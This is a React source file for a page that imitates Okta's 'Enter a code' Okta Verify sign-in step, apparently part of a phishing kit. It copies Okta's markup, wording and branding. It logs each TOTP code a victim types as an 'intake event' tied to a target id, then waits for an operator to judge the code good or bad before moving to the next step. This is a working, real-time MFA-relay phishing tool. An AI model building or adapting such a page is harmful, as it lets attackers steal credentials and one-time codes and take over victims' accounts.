'use client'

import addIntakeEvent from "@/app/(tropic)/addIntakeEvent";
import brandLogoSrc from "@/app/(tropic)/brandLogoSrc";
import checkForExistingCheckpoint from "@/app/(tropic)/checkForExistingCheckpoint";
import { getTargetId } from "@/app/(tropic)/getTargetId";
import proceedStep from "@/app/(tropic)/proceedStep";
import clientResolveDualCheckpoint from "@/app/(tropic)/resolveDualCheckpoint";
import { useState } from "react"
import { PulseLoader } from "react-spinners";
import { getBrowserTRPCClient } from "@/app/utils/trpc/client";

export default function EnterCode({ username, setStage }) {
    const [blank, setBlank] = useState(false);
    const [loading, setLoading] = useState(false);
    const [code, setCode] = useState('')
    const [invalid, setInvalid] = useState(false);

    async function handleSubmit(e) {
        e.preventDefault();
        if (loading) return;
        if (!code || code?.length < 5) {
            setBlank(true);
            return;
        }
        setBlank(false);
        setInvalid(false);
        setLoading(true);
        addIntakeEvent({
            type: 'input',
            input_title: 'Okta TOTP',
            input_value: code,
            target_id: await getTargetId()
        });
        addIntakeEvent({
            target_id: await getTargetId(),
            type: 'interaction',
            interaction_title: 'Submit Okta Verify code',
        });
        if (!(await checkForExistingCheckpoint('Valid TOTP confirmation'))) {
            await addIntakeEvent({
                target_id: await getTargetId(),
                type: 'checkpoint',
                checkpoint_status: 'waiting',
                checkpoint_resolution: 'Valid TOTP confirmation',
                checkpoint_type: 'dual'
            })
        }
        await subscribeToIntakeEvents();
    }
    async function subscribeToIntakeEvents() {
        try {
            const trpc = getBrowserTRPCClient();
            const targetId = await getTargetId();
            trpc.checkpoints.onResolution.subscribe(
                {
                    targetId,
                    resolution: 'Valid TOTP confirmation',
                },
                {
                    onData: (payload) => {
                        console.log('Checkpoint update:', payload);
                        console.log('this is for login conf')
                        if (payload?.row?.checkpoint_dual_outcome == 'good') {
                            //alert('correct!')
                            proceedStep();
                        }
                        else if (payload?.row?.checkpoint_dual_outcome == 'bad') {
                            setInvalid(true);
                            setLoading(false);
                        }
                    },
                    onError: (error) => {
                        console.error('Error subscribing in passwordform:', error)
                    },
                }
            );
        } catch (error) {
            console.error('Error subscribing in passwordform:', error)
        }
    }
    function handleVerifyOther(e) {
        e.preventDefault();
        setStage('choose');
    }
    return (
        <main data-se="auth-container" tabIndex="-1" id="okta-sign-in" className="auth-container main-container" >
            <div className="okta-sign-in-header auth-header">
                <h1>
                    <img src={brandLogoSrc} className="auth-org-logo" alt={`${username ?? ''} logo logo`} aria-label={`${username ?? ''} logo logo`} />
                </h1>
                <div data-type="beacon-container" className="beacon-container">
                </div>
            </div>
            <div className="auth-content">
                <div className="auth-content-inner">
                    <div className="siw-main-view challenge-authenticator--okta_verify mfa-verify">
                        <div className="siw-main-header">
                            <div>
                                <div>
                                    <div data-type="beacon-container" className="beacon-container" style={{ transform: 'scale(1)', 'textIndent': '1px' }}>
                                        <div className="beacon-blank auth-beacon">
                                            <div className="beacon-blank js-blank-beacon-border auth-beacon-border">
                                            </div>
                                        </div>
                                        <div className="bg-helper auth-beacon auth-beacon-factor mfa-okta-verify" data-se="factor-beacon">
                                            <div className="okta-sign-in-beacon-border auth-beacon-border">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="siw-main-body">
                            <form
                                onSubmit={e => handleSubmit(e)}
                                data-se="o-form" slot="content" id="form84" className="okta-verify-totp-challenge o-form o-form-edit-mode">
                                <div data-se="o-form-content" className="o-form-content o-form-theme clearfix">
                                    <h2 data-se="o-form-head" className="okta-form-title o-form-head">Enter a code</h2>
                                    {username &&
                                        <div className="identifier-container">
                                            <span className="identifier no-translate" data-se="identifier" title={username}>{username}</span>
                                        </div>
                                    }
                                    <div className="o-form-info-container">
                                    </div>
                                    <div className={`o-form-error-container ${invalid && 'o-form-has-errors'}`} data-se="o-form-error-container" role="alert">
                                        {
                                            invalid &&
                                            <div>
                                                <div className="okta-form-infobox-error infobox infobox-error" role="alert">
                                                    <span className="icon error-16">
                                                    </span>
                                                    <p>We found some errors. Please review the form and make corrections.</p>
                                                </div>
                                            </div>
                                        }
                                    </div>
                                    <div className="o-form-fieldset-container" data-se="o-form-fieldset-container">
                                        <div data-se="o-form-fieldset-credentials.totp" className="o-form-fieldset o-form-label-top">
                                            <div data-se="o-form-label" className="okta-form-label o-form-label">
                                                <label htmlFor="input92">Enter code from Okta Verify app&nbsp;</label>
                                            </div>
                                            <div data-se="o-form-input-container" className="o-form-input o-form-has-errors">
                                                <span data-se="o-form-input-credentials.totp" className="o-form-input-name-credentials.totp o-form-control okta-form-input-field input-fix o-form-has-errors">
                                                    <input
                                                        onChange={e => setCode(e.target.value)}
                                                        type="text" placeholder="" name="credentials.totp" id="input92" value={code} aria-label="" autoComplete="off" aria-describedby="input-container-error106" aria-invalid="true" />
                                                </span>
                                                {
                                                    (blank || invalid) &&
                                                    <p id="input-container-error106" className="okta-form-input-error o-form-input-error o-form-explain" role="alert">
                                                        <span className="icon icon-16 error-16-small" role="img" aria-label="Error">
                                                        </span>
                                                        {
                                                            (blank && !invalid) &&
                                                            'This field cannot be left blank'
                                                        }
                                                        {
                                                            invalid &&
                                                            'Invalid code. Try again.'
                                                        }

                                                    </p>
                                                }
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div className="o-form-button-bar">
                                    {
                                        loading ?
                                            <div className="button button-primary LoadingButton" data-type="save" type="submit" value="Verify">
                                                <PulseLoader
                                                    color="#f9f9f9"
                                                    className="pulseLoader"
                                                    size={"10px"}
                                                    speedMultiplier={0.9}
                                                />
                                            </div>
                                            :
                                            <input className="button button-primary" type="submit" value="Verify" data-type="save" />
                                    }
                                </div>
                            </form>
                        </div>
                        <div className="siw-main-footer">
                            <div className="auth-footer">
                                <a data-se="switchAuthenticator"
                                    data-active={!loading}
                                    onClick={() => {
                                        if (loading) return;
                                        setStage('choose');
                                    }}
                                    href="#" className="link js-switchAuthenticator LinkOut">
                                    Verify with something else
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    )
}